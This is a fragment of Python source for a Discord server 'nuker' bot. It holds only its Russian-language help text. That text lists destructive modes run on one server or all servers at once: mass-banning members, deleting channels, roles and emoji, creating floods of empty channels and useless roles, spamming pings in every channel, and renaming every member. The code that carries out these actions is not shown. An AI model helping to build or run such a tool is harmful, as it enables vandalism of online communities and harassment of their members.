...
if __name__ == "__main__":
    ...
    try:
        if sys.argv[1] == "help":
            help_banner()
            print("Режимы нюкера:\n\tРучной - настраиваемый режим, можно запустить командой на сервере или сразу на "
                  "всех серверах.\n\tАвтоматический - выполнит фулл нюк(см. ниже) на всех серверах.\n\nДействия "
                  "нюкера: \n\tf - full nuke - Автоматическое использование всех режимов.\n\tb - ban - Бан всех "
                  "участников, сможет забанить бот.\n\tdc - del channels - Удаление всех каналов, которых сможет бот, "
                  "и создание кучи пустых.\n\tdr - del roles - Удаление всех ролей, которых сможет бот, и создание "
                  "кучи бесполезных ролей.\n\ts - spam - Спам и пинг во всех каналах.\n\tnc - name change - Изменение "
                  "имени всем участникам сервера на случайные/выбранное\n\tde - del emoji - Удаление всех эмоджи на "
                  "сервере\n\tcs - channels spam - создание большого кол-ва пустых каналов\n\trs - roles spam - "
                  "создание большого кол-ва бесполезных ролей")
        else:
